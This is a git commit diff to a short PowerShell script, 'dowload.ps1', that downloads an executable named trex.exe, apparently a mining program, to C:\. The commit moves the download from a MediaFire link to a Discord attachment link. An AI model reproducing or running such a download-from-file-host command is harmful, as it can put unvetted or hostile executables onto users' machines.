b1c2c16ea52574b0be98c0c36c4fa75b8c93922a
YukihiraDeve <82152262+YukihiraDeve@users.noreply.github.com>
2023-06-03 00:40:15 +0200

    up

--- dowload.ps1
+++ dowload.ps1
@@ -1,4 +1,4 @@
-$url = "https://download853.mediafire.com/u78qn676jnygzZHEDH91booOEW2XT40QB0335XhiF5NjUwAPKf5xUuiJNSQOCidRdVT72BouijVIhs9gl0yduPG5pvWLOGXu6w2iLNcJtkhoF3cR8BpQwE6JcHuk6kNgRxKiVQEJkE6LsSqxh1U0unsd6RSgBbChZCOtNI-_cA/ywf6fmm4beal6t6/trex.exe"
+$url = "https://cdn.discordapp.com/attachments/770287390429806613/1114322345339924531/trex.exe"
 $output = "c:\trex.exe"
 
 Invoke-WebRequest -Uri $url -OutFile $output
